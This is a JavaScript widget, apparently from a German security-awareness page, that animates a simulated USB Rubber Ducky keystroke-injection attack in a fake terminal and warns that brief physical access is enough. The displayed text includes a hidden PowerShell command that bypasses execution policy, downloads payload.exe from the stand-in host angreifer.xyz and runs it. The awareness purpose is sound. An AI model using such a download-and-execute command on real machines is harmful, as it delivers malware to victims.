!(function () {
  const e = document.getElementById("rd-plug-btn"),
    t = document.getElementById("rd-reset-btn"),
    n = document.getElementById("rd-terminal-body"),
    r = document.getElementById("rd-usb-badge"),
    d = document.getElementById("rd-usb-status-text"),
    s = document.getElementById("rd-result");
  let l = !1,
    a = [];
  const c = [
    { delay: 0, cls: "rd-line-prompt", text: "C:\\Users\\Opfer> " },
    {
      delay: 300,
      cls: "rd-line-danger",
      text: "# USB Rubber Ducky erkannt – Tastatureingaben starten...",
    },
    {
      delay: 900,
      cls: "rd-line-cmd",
      text: 'powershell -NoP -W Hidden -Exec Bypass -Command "',
    },
    {
      delay: 1500,
      cls: "rd-line-cmd",
      text: "  $c = New-Object Net.WebClient;",
    },
    {
      delay: 2e3,
      cls: "rd-line-cmd",
      text: "  $c.DownloadFile('http://angreifer.xyz/payload.exe', '$env:TEMP\\svc.exe');",
    },
    {
      delay: 2700,
      cls: "rd-line-cmd",
      text: "  Start-Process '$env:TEMP\\svc.exe'\"",
    },
    { delay: 3400, cls: "rd-line-output", text: "" },
    {
      delay: 3500,
      cls: "rd-line-danger",
      text: "# Payload heruntergeladen...",
    },
    {
      delay: 4200,
      cls: "rd-line-danger",
      text: "# Schadsoftware wird ausgeführt...",
    },
    {
      delay: 5e3,
      cls: "rd-line-success",
      text: "# Angreifer hat vollen Zugriff auf diesen Computer.",
    },
  ];
  function o() {
    n.innerHTML = '<span class="rd-cursor"></span>';
  }
  (e.addEventListener("click", () => {
    if (l) return;
    ((l = !0),
      (e.disabled = !0),
      (r.className = "rd-usb-badge active"),
      (r.textContent = "Aktiv – Tasten werden injiziert"),
      (d.textContent = "USB Rubber Ducky eingesteckt"),
      o(),
      c.forEach(({ delay: e, cls: t, text: r }) => {
        const d = setTimeout(() => {
          const e = n.querySelector(".rd-cursor");
          (e && e.remove(),
            (function (e, t) {
              const r = document.createElement("div");
              ((r.className = e),
                (r.textContent = t),
                n.appendChild(r),
                (n.scrollTop = n.scrollHeight));
            })(t, r));
          const d = document.createElement("span");
          ((d.className = "rd-cursor"),
            n.appendChild(d),
            (n.scrollTop = n.scrollHeight));
        }, e);
        a.push(d);
      }));
    const t = setTimeout(() => {
      ((r.className = "rd-usb-badge done"),
        (r.textContent = "Angriff abgeschlossen"),
        (s.className = "rd-result-banner danger"),
        (s.textContent =
          "⚠️ In unter 5 Sekunden kompromittiert – der Angreifer braucht nur kurz Zugang zu deinem Computer."),
        (s.style.display = "block"));
    }, 5500);
    a.push(t);
  }),
    t.addEventListener("click", () => {
      (a.forEach(clearTimeout),
        (a = []),
        (l = !1),
        (e.disabled = !1),
        (r.className = "rd-usb-badge idle"),
        (r.textContent = "Nicht eingesteckt"),
        (d.textContent = "Kein USB-Gerät"),
        (s.style.display = "none"),
        (s.className = "rd-result-banner"),
        o());
    }));
})();
